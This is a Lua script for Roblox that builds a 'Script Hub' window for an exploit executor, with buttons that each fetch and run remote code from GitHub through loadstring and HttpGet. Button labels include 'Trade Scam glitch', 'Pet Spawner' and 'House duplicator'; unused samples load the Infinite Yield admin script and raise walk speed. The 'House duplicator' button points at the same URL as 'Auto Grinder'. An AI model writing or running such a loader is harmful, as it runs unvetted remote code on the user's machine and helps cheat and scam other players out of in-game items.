-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "ExecutorGUI"
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 250, 0, 270)
frame.Position = UDim2.new(0.5, -125, 0.5, -135)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Main color: black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- Border Effect (Optional)
local border = Instance.new("UIStroke")
border.Color = Color3.fromRGB(0, 170, 255) -- Light blue border
border.Thickness = 2
border.Parent = frame

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title Bar
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Script Hub"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

-- Close Button [❌]
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 18
closeButton.Parent = frame

-- Rounded close button
local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(1, 0)
closeCorner.Parent = closeButton

closeButton.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- Function to create script buttons
local function createButton(name, posY, scriptCode)
    local button = Instance.new("TextButton")
    button.Text = name
    button.Size = UDim2.new(1, -20, 0, 40)
    button.Position = UDim2.new(0, 10, 0, posY)
    button.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.SourceSans
    button.TextSize = 16
    button.Parent = frame

    -- Rounded corners
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = button

    button.MouseButton1Click:Connect(function()
        local func, err = loadstring(scriptCode)
        if func then
            func()
        else
            warn("Script Error:", err)
        end
    end)
end

-- Example scripts
local script1 = [[
    game.Players.LocalPlayer:Kick("Script 1 ran!")
]]

local script2 = [[
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
]]

local script3 = [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
]]
-- Add buttons
createButton("Pet Spawner", 40, [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/pet_spawners.lua"))()
]])

createButton("Trade Scam glitch", 90, [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/trade_scam.lua"))()
]])

createButton("Auto Grinder", 140, [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/Auto_grinder.lua"))()
]])

createButton("House duplicator", 190, [[
    loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/Auto_grinder.lua"))()
]])



